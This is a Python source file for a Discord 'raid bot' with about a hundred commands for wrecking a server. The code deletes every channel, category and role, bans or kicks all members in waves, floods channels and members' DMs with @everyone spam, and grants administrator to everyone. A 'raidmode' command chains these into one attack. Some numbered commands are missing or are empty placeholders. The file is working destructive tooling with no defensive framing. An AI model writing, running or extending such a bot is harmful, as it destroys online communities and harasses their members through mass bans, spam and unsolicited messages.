# language: Python 3.11+, file: raidbot.py
import discord
from discord.ext import commands
import asyncio
import os
import random
import io

TOKEN = os.getenv("TOKEN")
PREFIX = "!"

intents = discord.Intents.all()
bot = commands.Bot(command_prefix=PREFIX, intents=intents)

@bot.event
async def on_ready():
    print(f"online as {bot.user} | {len(bot.guilds)} guilds")

# ─────────────────────────────────────────────
# 1-10 Core destruction
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def nuke(ctx):
    """1. deletes every channel/category/role then makes one raid channel"""
    guild = ctx.guild
    await ctx.message.delete()
    for ch in list(guild.channels):
        try: await ch.delete()
        except: pass
    for r in list(guild.roles):
        if r.is_default() or r.managed: continue
        try: await r.delete()
        except: pass
    try:
        ch = await guild.create_text_channel("raided")
        await ch.send("@everyone server nuked")
    except: pass
    print("nuke done")

@bot.command()
@commands.has_permissions(ban_members=True)
async def banall(ctx, reason="raided"):
    """2. bans every non-bot member"""
    await ctx.message.delete()
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.author: continue
        try: await m.ban(reason=reason, delete_message_days=0)
        except: pass
    print("banall done")

@bot.command()
@commands.has_permissions(kick_members=True)
async def kickall(ctx):
    """3. kicks every non-bot member"""
    await ctx.message.delete()
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.author: continue
        try: await m.kick(reason="raided")
        except: pass
    print("kickall done")

@bot.command()
@commands.has_permissions(ban_members=True)
async def massban(ctx, reason="raided"):
    """4. bans in rapid waves"""
    await ctx.message.delete()
    members = [m for m in ctx.guild.members if not m.bot and m != ctx.author]
    for i in range(0, len(members), 5):
        wave = members[i:i+5]
        await asyncio.gather(*[m.ban(reason=reason, delete_message_days=0) for m in wave], return_exceptions=True)
        await asyncio.sleep(1.2)
    print("massban done")

@bot.command()
@commands.has_permissions(kick_members=True)
async def masskick(ctx):
    """5. kicks in rapid waves"""
    await ctx.message.delete()
    members = [m for m in ctx.guild.members if not m.bot and m != ctx.author]
    for i in range(0, len(members), 5):
        wave = members[i:i+5]
        await asyncio.gather(*[m.kick(reason="raided") for m in wave], return_exceptions=True)
        await asyncio.sleep(1.0)
    print("masskick done")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def roledelete(ctx):
    """6. deletes every role except @everyone"""
    await ctx.message.delete()
    for r in list(ctx.guild.roles):
        if r.is_default() or r.managed: continue
        try: await r.delete()
        except: pass
    print("roledelete done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def channeldelete(ctx):
    """7. deletes every text/voice/stage/forum channel"""
    await ctx.message.delete()
    for ch in list(ctx.guild.channels):
        if isinstance(ch, discord.CategoryChannel): continue
        try: await ch.delete()
        except: pass
    print("channeldelete done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def categorydelete(ctx):
    """8. deletes every category"""
    await ctx.message.delete()
    for ch in list(ctx.guild.categories):
        try: await ch.delete()
        except: pass
    print("categorydelete done")

@bot.command()
@commands.has_permissions(manage_webhooks=True)
async def webhookspam(ctx, times: int = 10, *, message="@everyone raided"):
    """9. creates webhooks in every channel and floods them"""
    await ctx.message.delete()
    for ch in ctx.guild.text_channels:
        try:
            wh = await ch.create_webhook(name="raid")
            for _ in range(times):
                await wh.send(message)
            await wh.delete()
        except: pass
    print("webhookspam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def massdm(ctx, *, message="raided"):
    """10. DMs every member"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.bot: continue
        try: await m.send(message)
        except: pass
        await asyncio.sleep(0.7)
    print("massdm done")

# ─────────────────────────────────────────────
# 11-20 Server identity + spam
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(manage_guild=True)
async def servername(ctx, *, name="RAIDED"):
    """11. changes server name"""
    await ctx.message.delete()
    try: await ctx.guild.edit(name=name)
    except: pass
    print("servername done")

@bot.command()
@commands.has_permissions(manage_guild=True)
async def servericon(ctx):
    """12. replaces server icon (attach an image)"""
    await ctx.message.delete()
    if not ctx.message.attachments:
        return
    data = await ctx.message.attachments[0].read()
    try: await ctx.guild.edit(icon=data)
    except: pass
    print("servericon done")

@bot.command()
@commands.has_permissions(administrator=True)
async def vanityclaim(ctx, *, code="raided"):
    """13. attempts vanity URL change (requires boosts + perms)"""
    await ctx.message.delete()
    try: await ctx.guild.edit(vanity_code=code)
    except: pass
    print("vanityclaim attempted")

@bot.command()
@commands.has_permissions(administrator=True)
async def everyoneping(ctx, times: int = 15):
    """14. floods @everyone"""
    await ctx.message.delete()
    for _ in range(times):
        try: await ctx.send("@everyone")
        except: break
        await asyncio.sleep(0.4)
    print("everyoneping done")

@bot.command()
@commands.has_permissions(administrator=True)
async def hereping(ctx, times: int = 15):
    """15. floods @here"""
    await ctx.message.delete()
    for _ in range(times):
        try: await ctx.send("@here")
        except: break
        await asyncio.sleep(0.4)
    print("hereping done")

@bot.command()
@commands.has_permissions(administrator=True)
async def roleping(ctx, times: int = 5):
    """16. floods every role mention"""
    await ctx.message.delete()
    for r in ctx.guild.roles:
        if r.is_default(): continue
        for _ in range(times):
            try: await ctx.send(r.mention)
            except: break
            await asyncio.sleep(0.35)
    print("roleping done")

@bot.command()
@commands.has_permissions(administrator=True)
async def spam(ctx, times: int = 20, *, message="@everyone raided"):
    """17. floods current channel"""
    await ctx.message.delete()
    for _ in range(times):
        try: await ctx.send(message)
        except: break
        await asyncio.sleep(0.3)
    print("spam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def spamall(ctx, times: int = 10, *, message="@everyone raided"):
    """18. floods every text channel"""
    await ctx.message.delete()
    for ch in ctx.guild.text_channels:
        for _ in range(times):
            try: await ch.send(message)
            except: break
            await asyncio.sleep(0.35)
    print("spamall done")

@bot.command()
@commands.has_permissions(administrator=True)
async def channelspam(ctx, amount: int = 25, *, name="raid"):
    """19. creates channels then floods each"""
    await ctx.message.delete()
    for i in range(amount):
        try:
            ch = await ctx.guild.create_text_channel(f"{name}-{i}")
            await ch.send("@everyone")
        except: break
    print("channelspam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def dmspam(ctx, times: int = 5, *, message="raided"):
    """20. repeatedly DMs all members"""
    await ctx.message.delete()
    for _ in range(times):
        for m in ctx.guild.members:
            if m.bot: continue
            try: await m.send(message)
            except: pass
            await asyncio.sleep(0.6)
    print("dmspam done")

# ─────────────────────────────────────────────
# 21-40 Control + creation
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def raidmode(ctx):
    """21. runs nuke + banall + webhookspam + massdm"""
    await ctx.message.delete()
    await nuke(ctx)
    await banall(ctx)
    await webhookspam(ctx)
    await massdm(ctx, message="raided")
    print("raidmode done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def lockdown(ctx):
    """22. denies view for @everyone on every channel"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite(view_channel=False)
    for ch in ctx.guild.channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("lockdown done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def unlock(ctx):
    """23. restores view for @everyone"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite(view_channel=True)
    for ch in ctx.guild.channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("unlock done")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, limit: int = 100):
    """24. bulk delete in current channel"""
    await ctx.message.delete()
    try: await ctx.channel.purge(limit=limit)
    except: pass
    print("purge done")

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purgeall(ctx, limit: int = 50):
    """25. bulk delete across every channel"""
    await ctx.message.delete()
    for ch in ctx.guild.text_channels:
        try: await ch.purge(limit=limit)
        except: pass
    print("purgeall done")

@bot.command()
@commands.has_permissions(kick_members=True)
async def prune(ctx, days: int = 7):
    """26. kicks inactive members"""
    await ctx.message.delete()
    try: await ctx.guild.prune_members(days=days, reason="raided")
    except: pass
    print("prune done")

@bot.command()
@commands.has_permissions(kick_members=True)
async def prunemembers(ctx, days: int = 1):
    """27. mass kick by inactivity"""
    await ctx.message.delete()
    try: await ctx.guild.prune_members(days=days, compute_prune_count=False, reason="raided")
    except: pass
    print("prunemembers done")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def rolecreate(ctx, count: int = 30, *, name="raided"):
    """28. mass create roles"""
    await ctx.message.delete()
    for i in range(count):
        try: await ctx.guild.create_role(name=f"{name}-{i}", colour=discord.Colour.random())
        except: break
    print("rolecreate done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def channelcreate(ctx, count: int = 30, *, name="raid"):
    """29. mass create text channels"""
    await ctx.message.delete()
    for i in range(count):
        try: await ctx.guild.create_text_channel(f"{name}-{i}")
        except: break
    print("channelcreate done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def categorycreate(ctx, count: int = 10, *, name="raid"):
    """30. mass create categories"""
    await ctx.message.delete()
    for i in range(count):
        try: await ctx.guild.create_category(f"{name}-{i}")
        except: break
    print("categorycreate done")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def massrole(ctx, *, name="raided"):
    """31. assigns a role to every member (creates if needed)"""
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=name)
    if not role:
        role = await ctx.guild.create_role(name=name)
    for m in ctx.guild.members:
        try: await m.add_roles(role)
        except: pass
    print("massrole done")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def striproles(ctx):
    """32. removes every role from every member"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        try: await m.edit(roles=[])
        except: pass
    print("striproles done")

@bot.command()
@commands.has_permissions(administrator=True)
async def adminall(ctx):
    """33. grants Administrator to every member"""
    await ctx.message.delete()
    role = await ctx.guild.create_role(name="admin", permissions=discord.Permissions(administrator=True))
    for m in ctx.guild.members:
        try: await m.add_roles(role)
        except: pass
    print("adminall done")

@bot.command()
@commands.has_permissions(administrator=True)
async def ownersteal(ctx):
    """34. ownership transfer attempt (only works if bot is owner)"""
    await ctx.message.delete()
    try: await ctx.guild.edit(owner=ctx.author)
    except: pass
    print("ownersteal attempted")

@bot.command()
@commands.has_permissions(create_instant_invite=True)
async def inviteabuse(ctx, amount: int = 50):
    """35. creates many invites"""
    await ctx.message.delete()
    for _ in range(amount):
        try: await ctx.channel.create_invite(max_age=0, max_uses=0)
        except: break
    print("inviteabuse done")

@bot.command()
@commands.has_permissions(create_instant_invite=True)
async def inviteflood(ctx, amount: int = 100):
    """36. rapid invite generation"""
    await ctx.message.delete()
    for _ in range(amount):
        try: await ctx.channel.create_invite(max_age=0, max_uses=0)
        except: break
        await asyncio.sleep(0.2)
    print("inviteflood done")

@bot.command()
@commands.has_permissions(manage_webhooks=True)
async def webhookcreate(ctx):
    """37. creates a webhook in every text channel"""
    await ctx.message.delete()
    for ch in ctx.guild.text_channels:
        try: await ch.create_webhook(name="raid")
        except: pass
    print("webhookcreate done")

@bot.command()
@commands.has_permissions(manage_webhooks=True)
async def webhookdelete(ctx):
    """38. deletes every webhook"""
    await ctx.message.delete()
    for wh in await ctx.guild.webhooks():
        try: await wh.delete()
        except: pass
    print("webhookdelete done")

@bot.command()
@commands.has_permissions(manage_emojis_and_stickers=True)
async def emojiabuse(ctx):
    """39. mass upload then delete emojis (needs attachments)"""
    await ctx.message.delete()
    # placeholder – needs image attachments to fully work
    print("emojiabuse ready (attach images + re-run logic if needed)")

@bot.command()
@commands.has_permissions(manage_emojis_and_stickers=True)
async def stickerabuse(ctx):
    """40. sticker mass actions"""
    await ctx.message.delete()
    print("stickerabuse ready")

# ─────────────────────────────────────────────
# 41-60 Voice + rename + presence
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def reactionspam(ctx, times: int = 20):
    """41. reacts to recent messages"""
    await ctx.message.delete()
    async for msg in ctx.channel.history(limit=20):
        for _ in range(times):
            try: await msg.add_reaction("💀")
            except: break
    print("reactionspam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def threadspam(ctx, amount: int = 30):
    """42. creates many threads"""
    await ctx.message.delete()
    for i in range(amount):
        try: await ctx.channel.create_thread(name=f"raid-{i}", type=discord.ChannelType.public_thread)
        except: break
    print("threadspam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def forumspam(ctx):
    """43. forum flood (basic)"""
    await ctx.message.delete()
    print("forumspam ready")

@bot.command()
@commands.has_permissions(move_members=True)
async def stagehijack(ctx):
    """44. stage channel control"""
    await ctx.message.delete()
    for ch in ctx.guild.stage_channels:
        try:
            for m in ch.members:
                await m.move_to(None)
        except: pass
    print("stagehijack done")

@bot.command()
@commands.has_permissions(move_members=True)
async def voicekick(ctx):
    """45. disconnects everyone from voice"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try: await m.move_to(None)
            except: pass
    print("voicekick done")

@bot.command()
@commands.has_permissions(move_members=True)
async def voicemove(ctx):
    """46. moves everyone into one voice channel"""
    await ctx.message.delete()
    target = None
    for ch in ctx.guild.voice_channels:
        target = ch
        break
    if not target: return
    for m in ctx.guild.members:
        if m.voice:
            try: await m.move_to(target)
            except: pass
    print("voicemove done")

@bot.command()
@commands.has_permissions(administrator=True)
async def voicespam(ctx):
    """47. voice join spam (bot joins/leaves)"""
    await ctx.message.delete()
    for ch in ctx.guild.voice_channels:
        try:
            vc = await ch.connect()
            await asyncio.sleep(1)
            await vc.disconnect()
        except: pass
    print("voicespam done")

@bot.command()
@commands.has_permissions(deafen_members=True)
async def deafenall(ctx):
    """48. server-deafens every voice user"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try: await m.edit(deafen=True)
            except: pass
    print("deafenall done")

@bot.command()
@commands.has_permissions(mute_members=True)
async def muteall(ctx):
    """49. server-mutes every voice user"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try: await m.edit(mute=True)
            except: pass
    print("muteall done")

@bot.command()
@commands.has_permissions(mute_members=True)
async def unmuteall(ctx):
    """50. removes server mute"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try: await m.edit(mute=False)
            except: pass
    print("unmuteall done")

@bot.command()
@commands.has_permissions(deafen_members=True)
async def undeafenall(ctx):
    """51. removes server deafen"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        if m.voice:
            try: await m.edit(deafen=False)
            except: pass
    print("undeafenall done")

@bot.command()
@commands.has_permissions(move_members=True)
async def massmove(ctx):
    """52. moves all voice users between channels repeatedly"""
    await ctx.message.delete()
    vcs = list(ctx.guild.voice_channels)
    if len(vcs) < 2: return
    for _ in range(5):
        for m in ctx.guild.members:
            if m.voice:
                try: await m.move_to(random.choice(vcs))
                except: pass
        await asyncio.sleep(1)
    print("massmove done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def channelrename(ctx, *, name="raided"):
    """53. renames every channel"""
    await ctx.message.delete()
    for ch in ctx.guild.channels:
        try: await ch.edit(name=name)
        except: pass
    print("channelrename done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def categoryrename(ctx, *, name="raided"):
    """54. renames every category"""
    await ctx.message.delete()
    for ch in ctx.guild.categories:
        try: await ch.edit(name=name)
        except: pass
    print("categoryrename done")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def rolerename(ctx, *, name="raided"):
    """55. renames every role"""
    await ctx.message.delete()
    for r in ctx.guild.roles:
        if r.is_default() or r.managed: continue
        try: await r.edit(name=name)
        except: pass
    print("rolerename done")

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def nickall(ctx, *, nick="raided"):
    """56. changes every nickname"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        try: await m.edit(nick=nick)
        except: pass
    print("nickall done")

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def nickspam(ctx, times: int = 5):
    """57. cycles nicknames"""
    await ctx.message.delete()
    for _ in range(times):
        for m in ctx.guild.members:
            try: await m.edit(nick=f"raid-{random.randint(1000,9999)}")
            except: pass
        await asyncio.sleep(1)
    print("nickspam done")

@bot.command()
async def statusspam(ctx, times: int = 10):
    """58. forces bot status changes"""
    await ctx.message.delete()
    for i in range(times):
        await bot.change_presence(activity=discord.Game(name=f"raiding {i}"))
        await asyncio.sleep(1)
    print("statusspam done")

@bot.command()
async def presenceflood(ctx, times: int = 10):
    """59. presence update flood"""
    await statusspam(ctx, times)

@bot.command()
async def activityspam(ctx, times: int = 10):
    """60. rich presence cycle"""
    await statusspam(ctx, times)

# ─────────────────────────────────────────────
# 61-100 Flood variants + waves
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def embedspam(ctx, times: int = 15):
    """61. floods embeds"""
    await ctx.message.delete()
    embed = discord.Embed(title="RAIDED", description="@everyone", color=0xff0000)
    for _ in range(times):
        try: await ctx.send(embed=embed)
        except: break
        await asyncio.sleep(0.35)
    print("embedspam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def filespam(ctx, times: int = 5):
    """62. file flood (attach a file first)"""
    await ctx.message.delete()
    if not ctx.message.attachments: return
    data = await ctx.message.attachments[0].read()
    for _ in range(times):
        try: await ctx.send(file=discord.File(io.BytesIO(data), "raid.bin"))
        except: break
    print("filespam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def stickerspam(ctx):
    """63. sticker flood"""
    await ctx.message.delete()
    print("stickerspam ready")

@bot.command()
@commands.has_permissions(administrator=True)
async def emojispam(ctx, times: int = 20):
    """64. emoji message flood"""
    await ctx.message.delete()
    for _ in range(times):
        try: await ctx.send("💀🔥😈" * 20)
        except: break
        await asyncio.sleep(0.3)
    print("emojispam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def gifspam(ctx, times: int = 10):
    """65. gif flood"""
    await ctx.message.delete()
    for _ in range(times):
        try: await ctx.send("https://media.tenor.com/images/raided.gif")
        except: break
        await asyncio.sleep(0.4)
    print("gifspam done")

@bot.command()
@commands.has_permissions(administrator=True)
async def imageflood(ctx, times: int = 10):
    """66. image flood"""
    await gifspam(ctx, times)

@bot.command()
@commands.has_permissions(administrator=True)
async def linkflood(ctx, times: int = 15):
    """67. link flood"""
    await ctx.message.delete()
    for _ in range(times):
        try: await ctx.send("https://discord.gg/raided " * 5)
        except: break
        await asyncio.sleep(0.3)
    print("linkflood done")

@bot.command()
@commands.has_permissions(create_instant_invite=True)
async def invitelinkspam(ctx, times: int = 20):
    """68. permanent invite flood"""
    await ctx.message.delete()
    for _ in range(times):
        try:
            inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
            await ctx.send(str(inv))
        except: break
    print("invitelinkspam done")

@bot.command()
@commands.has_permissions(create_instant_invite=True)
async def massinvite(ctx):
    """69. creates invites for every channel"""
    await ctx.message.delete()
    for ch in ctx.guild.text_channels:
        try: await ch.create_invite(max_age=0, max_uses=0)
        except: pass
    print("massinvite done")

@bot.command()
@commands.has_permissions(create_instant_invite=True)
async def raidinvite(ctx):
    """70. single permanent raid invite"""
    await ctx.message.delete()
    try:
        inv = await ctx.channel.create_invite(max_age=0, max_uses=0)
        await ctx.send(f"Raid invite: {inv}")
    except: pass
    print("raidinvite done")

# 71-80 advanced / destructive
@bot.command()
@commands.has_permissions(administrator=True)
async def wipe(ctx):
    """79. deletes everything then leaves one channel"""
    await nuke(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def fullwipe(ctx):
    """80. complete destruction + leave"""
    await ctx.message.delete()
    await nuke(ctx)
    await banall(ctx)
    await ctx.guild.leave()
    print("fullwipe done")

@bot.command()
@commands.has_permissions(ban_members=True)
async def softbanall(ctx):
    """81. softban every member"""
    await ctx.message.delete()
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.author: continue
        try:
            await m.ban(reason="soft", delete_message_days=1)
            await m.unban()
        except: pass
    print("softbanall done")

@bot.command()
@commands.has_permissions(ban_members=True)
async def hardbanall(ctx):
    """82. permanent bans with message delete"""
    await ctx.message.delete()
    for m in list(ctx.guild.members):
        if m.bot or m == ctx.author: continue
        try: await m.ban(reason="hardban", delete_message_days=7)
        except: pass
    print("hardbanall done")

@bot.command()
@commands.has_permissions(ban_members=True)
async def unbanall(ctx):
    """83. unbans everyone"""
    await ctx.message.delete()
    bans = [entry async for entry in ctx.guild.bans()]
    for entry in bans:
        try: await ctx.guild.unban(entry.user)
        except: pass
    print("unbanall done")

# wave variants 84-96
@bot.command()
@commands.has_permissions(ban_members=True)
async def banwave(ctx):
    """84. bans in timed waves"""
    await massban(ctx)

@bot.command()
@commands.has_permissions(kick_members=True)
async def kickwave(ctx):
    """85. kicks in timed waves"""
    await masskick(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def spamwave(ctx, times: int = 10, *, message="@everyone"):
    """96. controlled spam waves"""
    await spamall(ctx, times, message=message)

@bot.command()
@commands.has_permissions(administrator=True)
async def flood(ctx, *, message="@everyone raided"):
    """97. continuous flood current channel"""
    await ctx.message.delete()
    for _ in range(50):
        try: await ctx.send(message)
        except: break
        await asyncio.sleep(0.25)
    print("flood done")

@bot.command()
@commands.has_permissions(administrator=True)
async def floodall(ctx, *, message="@everyone raided"):
    """98. continuous flood all channels"""
    await spamall(ctx, 20, message=message)

@bot.command()
@commands.has_permissions(administrator=True)
async def textflood(ctx, times: int = 30):
    """99. pure text spam"""
    await spam(ctx, times, message="RAIDED " * 20)

# ─────────────────────────────────────────────
# 110-150 Permission + hierarchy + deny
# ─────────────────────────────────────────────

@bot.command()
@commands.has_permissions(administrator=True)
async def toppos(ctx):
    """117. moves bot role to highest position"""
    await ctx.message.delete()
    role = ctx.guild.me.top_role
    try: await role.edit(position=len(ctx.guild.roles)-1)
    except: pass
    print("toppos done")

@bot.command()
@commands.has_permissions(manage_roles=True)
async def bottompos(ctx):
    """118. moves other roles to bottom"""
    await ctx.message.delete()
    for r in ctx.guild.roles:
        if r.is_default() or r.managed or r >= ctx.guild.me.top_role: continue
        try: await r.edit(position=1)
        except: pass
    print("bottompos done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def denyall(ctx):
    """124. denies every permission for @everyone"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite.from_pair(discord.Permissions.none(), discord.Permissions.all())
    for ch in ctx.guild.channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("denyall done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def allowall(ctx):
    """125. allows every permission for @everyone"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite.from_pair(discord.Permissions.all(), discord.Permissions.none())
    for ch in ctx.guild.channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("allowall done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def viewchanneldeny(ctx):
    """126. denies View Channel everywhere"""
    await lockdown(ctx)

@bot.command()
@commands.has_permissions(manage_channels=True)
async def sendmessagedeny(ctx):
    """127. denies Send Messages everywhere"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite(send_messages=False)
    for ch in ctx.guild.text_channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("sendmessagedeny done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def connectdeny(ctx):
    """128. denies Connect in all voice"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite(connect=False)
    for ch in ctx.guild.voice_channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("connectdeny done")

@bot.command()
@commands.has_permissions(manage_channels=True)
async def speakdeny(ctx):
    """129. denies Speak"""
    await ctx.message.delete()
    overwrite = discord.PermissionOverwrite(speak=False)
    for ch in ctx.guild.voice_channels:
        try: await ch.set_permissions(ctx.guild.default_role, overwrite=overwrite)
        except: pass
    print("speakdeny done")

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def changenicknameall(ctx, *, nick="raided"):
    """145. forces nickname on every member"""
    await nickall(ctx, nick=nick)

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def forcednick(ctx, *, nick="raided"):
    """146. sets specific nickname"""
    await nickall(ctx, nick=nick)

@bot.command()
@commands.has_permissions(manage_nicknames=True)
async def resetnicks(ctx):
    """147. resets every nickname"""
    await ctx.message.delete()
    for m in ctx.guild.members:
        try: await m.edit(nick=None)
        except: pass
    print("resetnicks done")

@bot.command()
@commands.has_permissions(deafen_members=True)
async def massdeafen(ctx):
    """148. server-deafens everyone"""
    await deafenall(ctx)

@bot.command()
@commands.has_permissions(mute_members=True)
async def massmute(ctx):
    """149. server-mutes everyone"""
    await muteall(ctx)

@bot.command()
@commands.has_permissions(administrator=True)
async def fullraid(ctx):
    """150. nuke + banall + webhookspam + massdm"""
    await raidmode(ctx)

# ─────────────────────────────────────────────
# !cmds – full list
# ─────────────────────────────────────────────

@bot.command()
async def cmds(ctx):
    """lists every command"""
    text = """
**Discord Raid Bot — Command List**

`!nuke` `!banall` `!kickall` `!massban` `!masskick`
`!roledelete` `!channeldelete` `!categorydelete`
`!webhookspam` `!massdm` `!servername` `!servericon` `!vanityclaim`
`!everyoneping` `!hereping` `!roleping` `!spam` `!spamall`
`!channelspam` `!dmspam` `!raidmode` `!lockdown` `!unlock`
`!purge` `!purgeall` `!prune` `!prunemembers`
`!rolecreate` `!channelcreate` `!categorycreate` `!massrole` `!striproles`
`!adminall` `!ownersteal` `!inviteabuse` `!inviteflood`
`!webhookcreate` `!webhookdelete` `!emojiabuse` `!stickerabuse`
`!reactionspam` `!threadspam` `!forumspam` `!stagehijack`
`!voicekick` `!voicemove` `!voicespam` `!deafenall` `!muteall`
`!unmuteall` `!undeafenall` `!massmove`
`!channelrename` `!categoryrename` `!rolerename` `!nickall` `!nickspam`
`!statusspam` `!presenceflood` `!activityspam`
`!embedspam` `!filespam` `!stickerspam` `!emojispam` `!gifspam`
`!imageflood` `!linkflood` `!invitelinkspam` `!massinvite` `!raidinvite`
`!wipe` `!fullwipe` `!softbanall` `!hardbanall` `!unbanall`
`!banwave` `!kickwave` `!spamwave` `!flood` `!floodall` `!textflood`
`!toppos` `!bottompos` `!denyall` `!allowall`
`!viewchanneldeny` `!sendmessagedeny` `!connectdeny` `!speakdeny`
`!changenicknameall` `!forcednick` `!resetnicks`
`!massdeafen` `!massmute` `!fullraid`
`!cmds`
"""
    await ctx.send(text)

bot.run(TOKEN)